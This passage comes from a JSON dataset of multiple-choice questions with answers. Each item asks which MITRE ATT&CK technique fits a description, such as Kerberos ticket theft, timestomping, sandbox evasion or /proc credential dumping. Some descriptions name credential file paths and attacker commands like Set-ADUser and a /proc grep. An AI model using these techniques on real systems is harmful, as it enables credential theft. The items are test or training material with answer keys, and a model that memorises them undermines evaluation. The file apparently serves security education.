      "options": "A. Gather Victim Network Information: Network Security Appliances, B. Proxy: Domain Fronting, C. Gather Victim Network Information: Network Topology, D. Defacement",
      "choice": "B. Proxy: Domain Fronting",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAn adversary may attempt to evade process tree-based analysis by modifying executed malware's parent process ID (PPID). If endpoint protection software leverages the \u201cparent-child\" relationship for detection, breaking this relationship could result in the adversary\u2019s behavior not being associated with previous process tree activity. On Unix-based systems breaking this process tree is common practice for administrators to execute software using scripts and programs. \n\nOn Linux systems, adversaries may execute a series of Native API calls to alter malware's process tree. For example, adversaries can execute their payload without any arguments, call the `fork()` API call twice, then have the parent process exit. This creates a grandchild process with no parent process that is immediately adopted by the `init` system process (PID 1), which successfully disconnects the execution of the adversary's payload from its previous process tree.\n\nAnother example is using the \u201cdaemon\u201d syscall to detach from the current parent process and run in the background.\n\nOptions:\nA. Command and Scripting Interpreter: Cloud API, B. Masquerading: Break Process Trees, C. Stage Capabilities: Drive-by Target, D. Weaken Encryption: Reduce Key Space",
    "context": "",
    "output": "B. Masquerading: Break Process Trees",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAn adversary may attempt to evade process tree-based analysis by modifying executed malware's parent process ID (PPID). If endpoint protection software leverages the \u201cparent-child\" relationship for detection, breaking this relationship could result in the adversary\u2019s behavior not being associated with previous process tree activity. On Unix-based systems breaking this process tree is common practice for administrators to execute software using scripts and programs. \n\nOn Linux systems, adversaries may execute a series of Native API calls to alter malware's process tree. For example, adversaries can execute their payload without any arguments, call the `fork()` API call twice, then have the parent process exit. This creates a grandchild process with no parent process that is immediately adopted by the `init` system process (PID 1), which successfully disconnects the execution of the adversary's payload from its previous process tree.\n\nAnother example is using the \u201cdaemon\u201d syscall to detach from the current parent process and run in the background.",
      "options": "A. Command and Scripting Interpreter: Cloud API, B. Masquerading: Break Process Trees, C. Stage Capabilities: Drive-by Target, D. Weaken Encryption: Reduce Key Space",
      "choice": "B. Masquerading: Break Process Trees",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.\n\nDGAs can take the form of apparently random or \u201cgibberish\u201d strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.\n\nAdversaries may use DGAs for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.\n\nOptions:\nA. Unsecured Credentials: Private Keys, B. Event Triggered Execution: Unix Shell Configuration Modification, C. Data Obfuscation, D. Dynamic Resolution: Domain Generation Algorithms",
    "context": "",
    "output": "D. Dynamic Resolution: Domain Generation Algorithms",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.\n\nDGAs can take the form of apparently random or \u201cgibberish\u201d strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.\n\nAdversaries may use DGAs for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.",
      "options": "A. Unsecured Credentials: Private Keys, B. Event Triggered Execution: Unix Shell Configuration Modification, C. Data Obfuscation, D. Dynamic Resolution: Domain Generation Algorithms",
      "choice": "D. Dynamic Resolution: Domain Generation Algorithms",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable Pass the Ticket. Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as \u201crealms\u201d, there are three basic participants: client, service, and Key Distribution Center (KDC). Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.\n\nOn Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.\n\nLinux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the \"ccache\". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts. On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in <code>/var/lib/sss/secrets/secrets.ldb</code> as well as the corresponding key located in <code>/var/lib/sss/secrets/.secrets.mkey</code>. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for Pass the Ticket. The ccache file may also be converted into a Windows format using tools such as Kekeo.\n\n\nKerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using <code>kinit</code>, <code>klist</code>, <code>ktutil</code>, and <code>kcc</code> built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.\n\nPossible answers:\nA. Steal or Forge Kerberos Tickets, B. Phishing: Spearphishing via Service, C. Application Window Discovery, D. Boot or Logon Autostart Execution: XDG Autostart Entries",
    "context": "",
    "output": "A. Steal or Forge Kerberos Tickets",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable Pass the Ticket. Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as \u201crealms\u201d, there are three basic participants: client, service, and Key Distribution Center (KDC). Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.\n\nOn Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.\n\nLinux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the \"ccache\". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts. On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in <code>/var/lib/sss/secrets/secrets.ldb</code> as well as the corresponding key located in <code>/var/lib/sss/secrets/.secrets.mkey</code>. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for Pass the Ticket. The ccache file may also be converted into a Windows format using tools such as Kekeo.\n\n\nKerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using <code>kinit</code>, <code>klist</code>, <code>ktutil</code>, and <code>kcc</code> built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.",
      "options": "A. Steal or Forge Kerberos Tickets, B. Phishing: Spearphishing via Service, C. Application Window Discovery, D. Boot or Logon Autostart Execution: XDG Autostart Entries",
      "choice": "A. Steal or Forge Kerberos Tickets",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Answer which mitre technique is related to the description: Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name Masquerading to hide malware and tools.\nA. Masquerading: Masquerade Task or Service, B. Obfuscated Files or Information: Fileless Storage, C. Obfuscated Files or Information: Steganography, D. Indicator Removal: Timestomp\nAnswer:",
    "context": "",
    "output": "D. Indicator Removal: Timestomp",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name Masquerading to hide malware and tools.",
      "options": "A. Masquerading: Masquerade Task or Service, B. Obfuscated Files or Information: Fileless Storage, C. Obfuscated Files or Information: Steganography, D. Indicator Removal: Timestomp",
      "choice": "D. Indicator Removal: Timestomp",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data. By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct Change Default File Association and Masquerading to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.\nA. BITS Jobs, B. Gather Victim Host Information: Hardware, C. Data Manipulation: Runtime Data Manipulation, D. Endpoint Denial of Service: Service Exhaustion Flood\nAnswer:",
    "context": "",
    "output": "C. Data Manipulation: Runtime Data Manipulation",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data. By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct Change Default File Association and Masquerading to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
      "options": "A. BITS Jobs, B. Gather Victim Host Information: Hardware, C. Data Manipulation: Runtime Data Manipulation, D. Endpoint Denial of Service: Service Exhaustion Flood",
      "choice": "C. Data Manipulation: Runtime Data Manipulation",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct Phishing for Information or Phishing. Establishing email accounts may also allow adversaries to abuse free services \u2013 such as trial periods \u2013 to Acquire Infrastructure for follow-on purposes.\n\nAdversaries may also take steps to cultivate a persona around the email account, such as through use of Social Media Accounts, to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: Domains).\n\nTo decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.\nA. Establish Accounts: Email Accounts, B. Process Injection: Ptrace System Calls, C. Command and Scripting Interpreter: JavaScript, D. Network Boundary Bridging",
    "context": "",
    "output": "A. Establish Accounts: Email Accounts",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct Phishing for Information or Phishing. Establishing email accounts may also allow adversaries to abuse free services \u2013 such as trial periods \u2013 to Acquire Infrastructure for follow-on purposes.\n\nAdversaries may also take steps to cultivate a persona around the email account, such as through use of Social Media Accounts, to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: Domains).\n\nTo decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.",
      "options": "A. Establish Accounts: Email Accounts, B. Process Injection: Ptrace System Calls, C. Command and Scripting Interpreter: JavaScript, D. Network Boundary Bridging",
      "choice": "A. Establish Accounts: Email Accounts",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from The technique during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). The technique combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.\n\nPossible answers:\nA. Hijack Execution Flow: Dynamic Linker Hijacking, B. Impersonation, C. System Information Discovery, D. Obfuscated Files or Information: Stripped Payloads",
    "context": "",
    "output": "C. System Information Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from The technique during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). The technique combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "options": "A. Hijack Execution Flow: Dynamic Linker Hijacking, B. Impersonation, C. System Information Discovery, D. Obfuscated Files or Information: Stripped Payloads",
      "choice": "C. System Information Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.\n\nAdversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings. Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. Domain or Tenant Policy Modification) for their benefit.\n\nOptions:\nA. Search Open Technical Databases: CDNs, B. Exfiltration Over Physical Medium: Exfiltration over USB, C. Group Policy Discovery, D. Power Settings",
    "context": "",
    "output": "C. Group Policy Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.\n\nAdversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings. Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. Domain or Tenant Policy Modification) for their benefit.",
      "options": "A. Search Open Technical Databases: CDNs, B. Exfiltration Over Physical Medium: Exfiltration over USB, C. Group Policy Discovery, D. Power Settings",
      "choice": "C. Group Policy Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. \n\nIn order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, the technique may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged Valid Accounts.\n\nPossible answers:\nA. Account Manipulation, B. Compromise Infrastructure: DNS Server, C. Gather Victim Identity Information, D. Forge Web Credentials: SAML Tokens",
    "context": "",
    "output": "A. Account Manipulation",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. \n\nIn order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, the technique may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged Valid Accounts.",
      "options": "A. Account Manipulation, B. Compromise Infrastructure: DNS Server, C. Gather Victim Identity Information, D. Forge Web Credentials: SAML Tokens",
      "choice": "A. Account Manipulation",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\n\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \n\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use File and Directory Discovery to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as `malware`, `sample`, or `hash`.\n\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.\n\nA. Acquire Infrastructure: Virtual Private Server, B. Virtualization/Sandbox Evasion: System Checks, C. Hijack Execution Flow: Services File Permissions Weakness, D. Develop Capabilities: Digital Certificates\nAnswer:",
    "context": "",
    "output": "B. Virtualization/Sandbox Evasion: System Checks",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\n\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \n\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use File and Directory Discovery to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as `malware`, `sample`, or `hash`.\n\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.",
      "options": "A. Acquire Infrastructure: Virtual Private Server, B. Virtualization/Sandbox Evasion: System Checks, C. Hijack Execution Flow: Services File Permissions Weakness, D. Develop Capabilities: Digital Certificates",
      "choice": "B. Virtualization/Sandbox Evasion: System Checks",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAn adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.\n\nIf the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:\n\n1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>\n2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>\n3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)\n4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)\n\nWith this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.\n\nAn adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory PowerShell module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher. In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.\n\nA. Compromise Infrastructure: Botnet, B. Clipboard Data, C. Impair Defenses, D. Modify Authentication Process: Reversible Encryption\nA:",
    "context": "",
    "output": "D. Modify Authentication Process: Reversible Encryption",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAn adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.\n\nIf the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:\n\n1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>\n2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>\n3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)\n4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)\n\nWith this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.\n\nAn adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory PowerShell module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher. In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.",
      "options": "A. Compromise Infrastructure: Botnet, B. Clipboard Data, C. Impair Defenses, D. Modify Authentication Process: Reversible Encryption",
      "choice": "D. Modify Authentication Process: Reversible Encryption",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Answer which mitre technique is related to the description: Adversaries may gather credentials from the proc filesystem or `/proc`. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the `/proc/<PID>/maps` file shows how memory is mapped within the process\u2019s virtual address space. And `/proc/<PID>/mem`, exposed for debugging purposes, provides access to the process\u2019s virtual address space.\n\nWhen executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns indicative of credentials. Adversaries may use regex patterns, such as <code>grep -E \"^0-9a-f-* r\" /proc/\"$pid\"/maps | cut -d' ' -f 1</code>, to look for fixed strings in memory structures or cached hashes. When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process\u2019s memory.\n\nIf running as or with the permissions of a web browser, a process can search the `/maps` & `/mem` locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.\nA. Command and Scripting Interpreter: AppleScript, B. Subvert Trust Controls: Gatekeeper Bypass, C. OS Credential Dumping: Proc Filesystem, D. Masquerading: Double File Extension\nAnswer:",
    "context": "",
    "output": "C. OS Credential Dumping: Proc Filesystem",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may gather credentials from the proc filesystem or `/proc`. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the `/proc/<PID>/maps` file shows how memory is mapped within the process\u2019s virtual address space. And `/proc/<PID>/mem`, exposed for debugging purposes, provides access to the process\u2019s virtual address space.\n\nWhen executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns indicative of credentials. Adversaries may use regex patterns, such as <code>grep -E \"^0-9a-f-* r\" /proc/\"$pid\"/maps | cut -d' ' -f 1</code>, to look for fixed strings in memory structures or cached hashes. When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process\u2019s memory.\n\nIf running as or with the permissions of a web browser, a process can search the `/maps` & `/mem` locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.",
      "options": "A. Command and Scripting Interpreter: AppleScript, B. Subvert Trust Controls: Gatekeeper Bypass, C. OS Credential Dumping: Proc Filesystem, D. Masquerading: Double File Extension",
      "choice": "C. OS Credential Dumping: Proc Filesystem",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Answer which mitre technique is related to the description: Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API . Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.\n\nExfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.\nA. Replication Through Removable Media, B. Scheduled Task/Job: Scheduled Task, C. Exfiltration Over Web Service: Exfiltration to Code Repository, D. Data Encoding: Non-Standard Encoding\nAnswer:",
    "context": "",
    "output": "C. Exfiltration Over Web Service: Exfiltration to Code Repository",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API . Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.\n\nExfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.",
      "options": "A. Replication Through Removable Media, B. Scheduled Task/Job: Scheduled Task, C. Exfiltration Over Web Service: Exfiltration to Code Repository, D. Data Encoding: Non-Standard Encoding",
      "choice": "C. Exfiltration Over Web Service: Exfiltration to Code Repository",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
